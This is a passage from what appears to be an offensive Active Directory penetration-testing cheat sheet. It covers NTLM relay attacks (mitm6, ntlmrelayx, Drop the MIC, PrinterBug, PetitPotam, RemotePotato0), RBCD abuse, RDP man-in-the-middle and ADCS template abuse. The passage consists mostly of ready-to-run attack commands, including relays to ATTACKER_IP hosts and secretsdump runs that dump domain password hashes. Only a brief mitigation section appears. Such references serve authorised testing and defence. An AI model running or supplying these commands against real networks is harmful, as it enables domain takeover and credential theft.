<a id="__codelineno-172-19" name="__codelineno-172-19" href="#__codelineno-172-19"></a><span class="p">$</span> <span class="n">proxychains</span> <span class="n">crackmapexec</span> <span class="n">mssql</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">user</span> <span class="n">-p</span> <span class="s1">&#39;&#39;</span> <span class="n">-d</span> <span class="n">DOMAIN</span> <span class="n">-q</span> <span class="s2">&quot;SELECT 1&quot;</span>   
</code></pre></div></li>
</ol>
<p><strong>Mitigations</strong>:</p>
<ul>
<li>Disable LLMNR via group policy
    <div class="highlight"><pre><span></span><code><a id="__codelineno-173-1" name="__codelineno-173-1" href="#__codelineno-173-1"></a><span class="n">Open</span> <span class="n">gpedit</span><span class="p">.</span><span class="n">msc</span> <span class="n">and</span> <span class="n">navigate</span> <span class="n">to</span> <span class="n">Computer</span> <span class="n">Configuration</span> <span class="p">&gt;</span> <span class="n">Administrative</span> <span class="n">Templates</span> <span class="p">&gt;</span> <span class="n">Network</span> <span class="p">&gt;</span> <span class="n">DNS</span> <span class="n">Client</span> <span class="p">&gt;</span> <span class="n">Turn</span> <span class="n">off</span> <span class="n">multicast</span> <span class="n">name</span> <span class="n">resolution</span> <span class="n">and</span> <span class="nb">set </span><span class="n">to</span> <span class="n">Enabled</span>
</code></pre></div></li>
<li>Disable NBT-NS
    <div class="highlight"><pre><span></span><code><a id="__codelineno-174-1" name="__codelineno-174-1" href="#__codelineno-174-1"></a><span class="n">This</span> <span class="n">can</span> <span class="n">be</span> <span class="n">achieved</span> <span class="n">by</span> <span class="n">navigating</span> <span class="n">through</span> <span class="n">the</span> <span class="n">GUI</span> <span class="n">to</span> <span class="n">Network</span> <span class="n">card</span> <span class="p">&gt;</span> <span class="n">Properties</span> <span class="p">&gt;</span> <span class="n">IPv4</span> <span class="p">&gt;</span> <span class="n">Advanced</span> <span class="p">&gt;</span> <span class="n">WINS</span> <span class="n">and</span> <span class="n">then</span> <span class="n">under</span> <span class="s2">&quot;NetBIOS setting&quot;</span> <span class="nb">select </span><span class="n">Disable</span> <span class="n">NetBIOS</span> <span class="n">over</span> <span class="n">TCP</span><span class="p">/</span><span class="n">IP</span>
</code></pre></div></li>
</ul>
<h3 id="smb-signing-disabled-and-ipv6">SMB Signing Disabled and IPv6</h3>
<p>Since <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077">MS16-077</a> the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-175-1" name="__codelineno-175-1" href="#__codelineno-175-1"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$hosts</span> <span class="p">-</span><span class="n">-gen-relay-list</span> <span class="n">relay</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-175-2" name="__codelineno-175-2" href="#__codelineno-175-2"></a>
<a id="__codelineno-175-3" name="__codelineno-175-3" href="#__codelineno-175-3"></a><span class="c"># DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6</span>
<a id="__codelineno-175-4" name="__codelineno-175-4" href="#__codelineno-175-4"></a><span class="c"># -d is the domain name that we filter our request on - the attacked domain</span>
<a id="__codelineno-175-5" name="__codelineno-175-5" href="#__codelineno-175-5"></a><span class="c"># -i is the interface we have mitm6 listen on for events</span>
<a id="__codelineno-175-6" name="__codelineno-175-6" href="#__codelineno-175-6"></a><span class="n">mitm6</span> <span class="n">-i</span> <span class="n">eth0</span> <span class="n">-d</span> <span class="nv">$domain</span>
<a id="__codelineno-175-7" name="__codelineno-175-7" href="#__codelineno-175-7"></a>
<a id="__codelineno-175-8" name="__codelineno-175-8" href="#__codelineno-175-8"></a><span class="c"># spoofing WPAD and relaying NTLM credentials</span>
<a id="__codelineno-175-9" name="__codelineno-175-9" href="#__codelineno-175-9"></a><span class="n">impacket-ntlmrelayx</span> <span class="p">-</span><span class="n">6</span> <span class="n">-wh</span> <span class="nv">$attacker_ip</span> <span class="n">-of</span> <span class="n">loot</span> <span class="n">-tf</span> <span class="n">relay</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-175-10" name="__codelineno-175-10" href="#__codelineno-175-10"></a><span class="n">impacket-ntlmrelayx</span> <span class="p">-</span><span class="n">6</span> <span class="n">-wh</span> <span class="nv">$attacker_ip</span> <span class="n">-l</span> <span class="p">/</span><span class="n">tmp</span> <span class="n">-socks</span> <span class="n">-debug</span>
<a id="__codelineno-175-11" name="__codelineno-175-11" href="#__codelineno-175-11"></a>
<a id="__codelineno-175-12" name="__codelineno-175-12" href="#__codelineno-175-12"></a><span class="c"># -ip is the interface you want the relay to run on</span>
<a id="__codelineno-175-13" name="__codelineno-175-13" href="#__codelineno-175-13"></a><span class="c"># -wh is for WPAD host, specifying your wpad file to serve</span>
<a id="__codelineno-175-14" name="__codelineno-175-14" href="#__codelineno-175-14"></a><span class="c"># -t is the target where you want to relay to. </span>
<a id="__codelineno-175-15" name="__codelineno-175-15" href="#__codelineno-175-15"></a><span class="n">impacket-ntlmrelayx</span> <span class="n">-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">1</span> <span class="n">-wh</span> <span class="nv">$attacker_ip</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">2</span>
</code></pre></div>
<h3 id="drop-the-mic">Drop the MIC</h3>
<blockquote>
<p>The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP</p>
</blockquote>
<p>Check vulnerability with <a href="https://github.com/fox-it/cve-2019-1040-scanner">cve-2019-1040-scanner</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-176-1" name="__codelineno-176-1" href="#__codelineno-176-1"></a><span class="n">python2</span> <span class="n">scanMIC</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;DOMAIN/USERNAME:PASSWORD@TARGET&#39;</span>
<a id="__codelineno-176-2" name="__codelineno-176-2" href="#__codelineno-176-2"></a><span class="p">[*]</span> <span class="n">CVE</span><span class="p">-</span><span class="n">2019</span><span class="p">-</span><span class="n">1040</span> <span class="n">scanner</span> <span class="n">by</span> <span class="nv">@_dirkjan</span> <span class="p">/</span> <span class="n">Fox-IT</span> <span class="p">-</span> <span class="n">Based</span> <span class="n">on</span> <span class="n">impacket</span> <span class="n">by</span> <span class="n">SecureAuth</span>
<a id="__codelineno-176-3" name="__codelineno-176-3" href="#__codelineno-176-3"></a><span class="p">[*]</span> <span class="n">Target</span> <span class="n">TARGET</span> <span class="n">is</span> <span class="n">not</span> <span class="n">vulnerable</span> <span class="n">to</span> <span class="n">CVE</span><span class="p">-</span><span class="n">2019</span><span class="p">-</span><span class="n">1040</span> <span class="p">(</span><span class="n">authentication</span> <span class="n">was</span> <span class="n">rejected</span><span class="p">)</span>
</code></pre></div>
<ul>
<li>
<p>Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD
    <div class="highlight"><pre><span></span><code><a id="__codelineno-177-1" name="__codelineno-177-1" href="#__codelineno-177-1"></a><span class="n">TERM1</span><span class="p">&gt;</span> <span class="n">python</span> <span class="n">printerbug</span><span class="p">.</span><span class="n">py</span> <span class="n">testsegment</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span><span class="nv">@s2012exc</span><span class="p">.</span><span class="n">testsegment</span><span class="p">.</span><span class="n">local</span> <span class="p">&lt;</span><span class="n">attacker</span> <span class="n">ip</span><span class="p">/</span><span class="n">hostname</span><span class="p">&gt;</span>
<a id="__codelineno-177-2" name="__codelineno-177-2" href="#__codelineno-177-2"></a><span class="n">TERM2</span><span class="p">&gt;</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-remove-mic</span> <span class="p">-</span><span class="n">-escalate-user</span> <span class="n">ntu</span> <span class="n">-t</span> <span class="n">ldap</span><span class="p">://</span><span class="n">s2016dc</span><span class="p">.</span><span class="n">testsegment</span><span class="p">.</span><span class="n">local</span> <span class="n">-smb2support</span>
<a id="__codelineno-177-3" name="__codelineno-177-3" href="#__codelineno-177-3"></a><span class="n">TERM1</span><span class="p">&gt;</span> <span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">testsegment</span><span class="p">/</span><span class="n">ntu</span><span class="nv">@s2016dc</span><span class="p">.</span><span class="n">testsegment</span><span class="p">.</span><span class="n">local</span> <span class="n">-just-dc</span>
</code></pre></div></p>
</li>
<li>
<p>Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-178-1" name="__codelineno-178-1" href="#__codelineno-178-1"></a><span class="c"># create a new machine account</span>
<a id="__codelineno-178-2" name="__codelineno-178-2" href="#__codelineno-178-2"></a><span class="n">TERM1</span><span class="p">&gt;</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">rlt-dc</span><span class="p">.</span><span class="n">relaytest</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-remove-mic</span> <span class="p">-</span><span class="n">-delegate-access</span> <span class="n">-smb2support</span> 
<a id="__codelineno-178-3" name="__codelineno-178-3" href="#__codelineno-178-3"></a><span class="n">TERM2</span><span class="p">&gt;</span> <span class="n">python</span> <span class="n">printerbug</span><span class="p">.</span><span class="n">py</span> <span class="n">relaytest</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span><span class="nv">@second</span><span class="n">-dc-server</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">6</span>
<a id="__codelineno-178-4" name="__codelineno-178-4" href="#__codelineno-178-4"></a><span class="n">TERM1</span><span class="p">&gt;</span> <span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-spn</span> <span class="n">host</span><span class="p">/</span><span class="n">second-dc-server</span><span class="p">.</span><span class="n">local</span> <span class="s1">&#39;relaytest.local/MACHINE$:PASSWORD&#39;</span> <span class="n">-impersonate</span> <span class="n">DOMAIN_ADMIN_USER_NAME</span>
<a id="__codelineno-178-5" name="__codelineno-178-5" href="#__codelineno-178-5"></a>
<a id="__codelineno-178-6" name="__codelineno-178-6" href="#__codelineno-178-6"></a><span class="c"># connect using the ticket</span>
<a id="__codelineno-178-7" name="__codelineno-178-7" href="#__codelineno-178-7"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">DOMAIN_ADMIN_USER_NAME</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-178-8" name="__codelineno-178-8" href="#__codelineno-178-8"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">second-dc-server</span><span class="p">.</span><span class="n">local</span> <span class="n">-just-dc</span>
</code></pre></div></p>
</li>
</ul>
<h3 id="ghost-potato-cve-2019-1384">Ghost Potato - CVE-2019-1384</h3>
<p>Requirements:
* User must be a member of the local Administrators group
* User must be a member of the Backup Operators group
* Token must be elevated</p>
<p>Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-179-1" name="__codelineno-179-1" href="#__codelineno-179-1"></a><span class="n">ntlmrelayx</span> <span class="n">-smb2support</span> <span class="p">-</span><span class="n">-no-smb-server</span> <span class="p">-</span><span class="n">-gpotato-startup</span> <span class="n">rat</span><span class="p">.</span><span class="n">exe</span>
</code></pre></div>
<h3 id="remotepotato0-dcom-dce-rpc-relay">RemotePotato0 DCOM DCE RPC relay</h3>
<blockquote>
<p>It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine</p>
</blockquote>
<p>Requirements:
- a shell in session 0 (e.g. WinRm shell or SSH shell)
- a privileged user is logged on in the session 1 (e.g. a Domain Admin user)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-180-1" name="__codelineno-180-1" href="#__codelineno-180-1"></a><span class="c"># https://github.com/antonioCoco/RemotePotato0/</span>
<a id="__codelineno-180-2" name="__codelineno-180-2" href="#__codelineno-180-2"></a><span class="n">Terminal</span><span class="p">&gt;</span> <span class="n">sudo</span> <span class="n">socat</span> <span class="n">TCP-LISTEN</span><span class="p">:</span><span class="n">135</span><span class="p">,</span><span class="n">fork</span><span class="p">,</span><span class="n">reuseaddr</span> <span class="n">TCP</span><span class="p">:</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">83</span><span class="p">.</span><span class="n">131</span><span class="p">:</span><span class="n">9998</span> <span class="p">&amp;</span> <span class="c"># Can be omitted for Windows Server &lt;= 2016</span>
<a id="__codelineno-180-3" name="__codelineno-180-3" href="#__codelineno-180-3"></a><span class="n">Terminal</span><span class="p">&gt;</span> <span class="n">sudo</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">ldap</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">83</span><span class="p">.</span><span class="n">135</span> <span class="p">-</span><span class="n">-no-wcf-server</span> <span class="p">-</span><span class="n">-escalate-user</span> <span class="n">winrm_user_1</span>
<a id="__codelineno-180-4" name="__codelineno-180-4" href="#__codelineno-180-4"></a><span class="n">Session0</span><span class="p">&gt;</span> <span class="n">RemotePotato0</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">83</span><span class="p">.</span><span class="n">130</span> <span class="n">-p</span> <span class="n">9998</span> <span class="n">-s</span> <span class="n">2</span>
<a id="__codelineno-180-5" name="__codelineno-180-5" href="#__codelineno-180-5"></a><span class="n">Terminal</span><span class="p">&gt;</span> <span class="n">psexec</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;LAB/winrm_user_1:Password123!@192.168.83.135&#39;</span>
</code></pre></div>
<h3 id="dns-poisonning-relay-delegation-with-mitm6">DNS Poisonning - Relay delegation with mitm6</h3>
<p>Requirements: 
- IPv6 enabled (Windows prefers IPV6 over IPv4)
- LDAP over TLS (LDAPS)</p>
<blockquote>
<p>ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-181-1" name="__codelineno-181-1" href="#__codelineno-181-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">fox-it</span><span class="p">/</span><span class="n">mitm6</span><span class="p">.</span><span class="n">git</span> 
<a id="__codelineno-181-2" name="__codelineno-181-2" href="#__codelineno-181-2"></a><span class="nb">cd </span><span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">mitm6</span>
<a id="__codelineno-181-3" name="__codelineno-181-3" href="#__codelineno-181-3"></a><span class="n">pip</span> <span class="n">install</span> <span class="p">.</span>
<a id="__codelineno-181-4" name="__codelineno-181-4" href="#__codelineno-181-4"></a>
<a id="__codelineno-181-5" name="__codelineno-181-5" href="#__codelineno-181-5"></a><span class="n">mitm6</span> <span class="n">-hw</span> <span class="n">ws02</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-ignore-nofqnd</span>
<a id="__codelineno-181-6" name="__codelineno-181-6" href="#__codelineno-181-6"></a><span class="c"># -d: the domain name that we filter our request on (the attacked domain)</span>
<a id="__codelineno-181-7" name="__codelineno-181-7" href="#__codelineno-181-7"></a><span class="c"># -i: the interface we have mitm6 listen on for events</span>
<a id="__codelineno-181-8" name="__codelineno-181-8" href="#__codelineno-181-8"></a><span class="c"># -hw: host whitelist</span>
<a id="__codelineno-181-9" name="__codelineno-181-9" href="#__codelineno-181-9"></a>
<a id="__codelineno-181-10" name="__codelineno-181-10" href="#__codelineno-181-10"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">dc01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-wh</span> <span class="n">attacker-wpad</span>
<a id="__codelineno-181-11" name="__codelineno-181-11" href="#__codelineno-181-11"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">dc01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-wh</span> <span class="n">attacker-wpad</span> <span class="p">-</span><span class="n">-add-computer</span>
<a id="__codelineno-181-12" name="__codelineno-181-12" href="#__codelineno-181-12"></a><span class="c"># -ip: the interface you want the relay to run on</span>
<a id="__codelineno-181-13" name="__codelineno-181-13" href="#__codelineno-181-13"></a><span class="c"># -wh: WPAD host, specifying your wpad file to serve</span>
<a id="__codelineno-181-14" name="__codelineno-181-14" href="#__codelineno-181-14"></a><span class="c"># -t: the target where you want to relay to</span>
<a id="__codelineno-181-15" name="__codelineno-181-15" href="#__codelineno-181-15"></a>
<a id="__codelineno-181-16" name="__codelineno-181-16" href="#__codelineno-181-16"></a><span class="c"># now granting delegation rights and then do a RBCD</span>
<a id="__codelineno-181-17" name="__codelineno-181-17" href="#__codelineno-181-17"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">ldaps</span><span class="p">://</span><span class="n">dc01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-delegate-access</span> <span class="p">-</span><span class="n">-no-smb-server</span> <span class="n">-wh</span> <span class="n">attacker-wpad</span>
<a id="__codelineno-181-18" name="__codelineno-181-18" href="#__codelineno-181-18"></a><span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">target</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">GENERATED</span><span class="p">\$</span> <span class="n">-impersonate</span> <span class="n">Administrator</span>  
<a id="__codelineno-181-19" name="__codelineno-181-19" href="#__codelineno-181-19"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">administrator</span><span class="p">.</span><span class="n">ccache</span>  
<a id="__codelineno-181-20" name="__codelineno-181-20" href="#__codelineno-181-20"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">target</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span>  
</code></pre></div>
<h3 id="relaying-with-webdav-trick">Relaying with WebDav Trick</h3>
<blockquote>
<p>Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB</p>
</blockquote>
<p><strong>Requirement</strong>:
*  WebClient service</p>
<p><strong>Exploitation</strong>:
* Disable HTTP in Responder: <code>sudo vi /usr/share/responder/Responder.conf</code>
* Generate a Windows machine name: <code>sudo responder -I eth0</code>, e.g: WIN-UBNW4FI3AP0
* Prepare for RBCD against the DC: <code>python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support</code>
* Discover WebDAV services
    <div class="highlight"><pre><span></span><code><a id="__codelineno-182-1" name="__codelineno-182-1" href="#__codelineno-182-1"></a><span class="n">webclientservicescanner</span> <span class="s1">&#39;domain.local&#39;</span><span class="p">/</span><span class="s1">&#39;user&#39;</span><span class="p">:</span><span class="s1">&#39;password&#39;</span><span class="p">@</span><span class="s1">&#39;machine&#39;</span>
<a id="__codelineno-182-2" name="__codelineno-182-2" href="#__codelineno-182-2"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="s1">&#39;TARGETS&#39;</span> <span class="n">-d</span> <span class="s1">&#39;domain&#39;</span> <span class="n">-u</span> <span class="s1">&#39;user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="n">-M</span> <span class="n">webdav</span>
<a id="__codelineno-182-3" name="__codelineno-182-3" href="#__codelineno-182-3"></a><span class="n">GetWebDAVStatus</span><span class="p">.</span><span class="n">exe</span> <span class="s1">&#39;machine&#39;</span>
</code></pre></div>
* Trigger the authentication to relay to our nltmrelayx: <code>PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4</code>, the listener host must be specified with the FQDN or full netbios name like <code>logger.domain.local@80/test.txt</code>. Specifying the IP results in anonymous auth instead of System. 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-183-1" name="__codelineno-183-1" href="#__codelineno-183-1"></a><span class="c"># PrinterBug</span>
<a id="__codelineno-183-2" name="__codelineno-183-2" href="#__codelineno-183-2"></a><span class="n">dementor</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="s2">&quot;DOMAIN&quot;</span> <span class="n">-u</span> <span class="s2">&quot;USER&quot;</span> <span class="n">-p</span> <span class="s2">&quot;PASSWORD&quot;</span> <span class="s2">&quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span> <span class="s2">&quot;ATTACKER_IP&quot;</span>
<a id="__codelineno-183-3" name="__codelineno-183-3" href="#__codelineno-183-3"></a><span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;ATTACKER_IP&quot;</span> <span class="s2">&quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span>
<a id="__codelineno-183-4" name="__codelineno-183-4" href="#__codelineno-183-4"></a>
<a id="__codelineno-183-5" name="__codelineno-183-5" href="#__codelineno-183-5"></a><span class="c"># PetitPotam</span>
<a id="__codelineno-183-6" name="__codelineno-183-6" href="#__codelineno-183-6"></a><span class="n">Petitpotam</span><span class="p">.</span><span class="n">py</span> <span class="s2">&quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span> <span class="s2">&quot;ATTACKER_IP&quot;</span>
<a id="__codelineno-183-7" name="__codelineno-183-7" href="#__codelineno-183-7"></a><span class="n">Petitpotam</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="s2">&quot;DOMAIN&quot;</span> <span class="n">-u</span> <span class="s2">&quot;USER&quot;</span> <span class="n">-p</span> <span class="s2">&quot;PASSWORD&quot;</span> <span class="s2">&quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span> <span class="s2">&quot;ATTACKER_IP&quot;</span>
<a id="__codelineno-183-8" name="__codelineno-183-8" href="#__codelineno-183-8"></a><span class="n">PetitPotam</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span> <span class="s2">&quot;ATTACKER_IP&quot;</span>
</code></pre></div>
* Use the created account to ask for a service ticket: 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-184-1" name="__codelineno-184-1" href="#__codelineno-184-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">purple</span><span class="p">.</span><span class="n">lab</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">WVLFLLKZ</span><span class="p">$</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s1">&#39;iUAL)l&lt;i$;UzD7W&#39;</span>
<a id="__codelineno-184-2" name="__codelineno-184-2" href="#__codelineno-184-2"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">WVLFLLKZ</span><span class="p">$</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="n">E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">host</span><span class="p">/</span><span class="n">pc1</span><span class="p">.</span><span class="n">purple</span><span class="p">.</span><span class="n">lab</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:</span><span class="n">cifs</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-184-3" name="__codelineno-184-3" href="#__codelineno-184-3"></a><span class="nb">ls </span><span class="p">\\</span><span class="n">PC1</span><span class="p">.</span><span class="n">purple</span><span class="p">.</span><span class="n">lab</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
<a id="__codelineno-184-4" name="__codelineno-184-4" href="#__codelineno-184-4"></a><span class="c"># IP of PC1: 10.0.0.4</span>
</code></pre></div></p>
<h3 id="man-in-the-middle-rdp-connections-with-pyrdp-mitm">Man-in-the-middle RDP connections with pyrdp-mitm</h3>
<ul>
<li>https://github.com/GoSecure/pyrdp</li>
<li>https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/</li>
<li>Usage
<div class="highlight"><pre><span></span><code><a id="__codelineno-185-1" name="__codelineno-185-1" href="#__codelineno-185-1"></a>pyrdp-mitm.py<span class="w"> </span>&lt;IP&gt;
<a id="__codelineno-185-2" name="__codelineno-185-2" href="#__codelineno-185-2"></a>pyrdp-mitp.py<span class="w"> </span>&lt;IP&gt;:&lt;PORT&gt;<span class="w"> </span><span class="c1"># with custom port</span>
<a id="__codelineno-185-3" name="__codelineno-185-3" href="#__codelineno-185-3"></a>pyrdp-mitm.py<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-k<span class="w"> </span>private_key.pem<span class="w"> </span>-c<span class="w"> </span>certificate.pem<span class="w"> </span><span class="c1"># with custom key and certificate</span>
</code></pre></div></li>
<li>Exploitation</li>
<li>If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge</li>
<li>If NLA is disabled, you will obtain the password in plaintext</li>
<li>Other features are available such as keystroke recording</li>
<li>Alternatives</li>
<li>S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener  </li>
</ul>
<h2 id="active-directory-certificate-services">Active Directory Certificate Services</h2>
<ul>
<li>Find ADCS Server</li>
<li><code>crackmapexec ldap domain.lab -u username -p password -M adcs</code></li>
<li><code>ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=&lt;user&gt;,OU=Users,DC=domain,DC=local' -w '&lt;password&gt;' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName</code></li>
<li>Enumerate AD Enterprise CAs with certutil: <code>certutil.exe -config - -ping</code>, <code>certutil -dump</code></li>
</ul>
<h3 id="esc1-misconfigured-certificate-templates">ESC1 - Misconfigured Certificate Templates</h3>
<blockquote>
<p>Domain Users can enroll in the <strong>VulnTemplate</strong> template, which can be used for client authentication and has <strong>ENROLLEE_SUPPLIES_SUBJECT</strong> set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.</p>
</blockquote>
<p>Requirements:
*  Template that allows for AD authentication
* <strong>ENROLLEE_SUPPLIES_SUBJECT</strong> flag
* [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage) </p>
<p>Exploitation:
* Use <a href="https://github.com/GhostPack/Certify">Certify.exe</a> to see if there are any vulnerable templates
    <div class="highlight"><pre><span></span><code><a id="__codelineno-186-1" name="__codelineno-186-1" href="#__codelineno-186-1"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span>
<a id="__codelineno-186-2" name="__codelineno-186-2" href="#__codelineno-186-2"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span> <span class="p">/</span><span class="n">currentuser</span>
<a id="__codelineno-186-3" name="__codelineno-186-3" href="#__codelineno-186-3"></a><span class="c"># or</span>
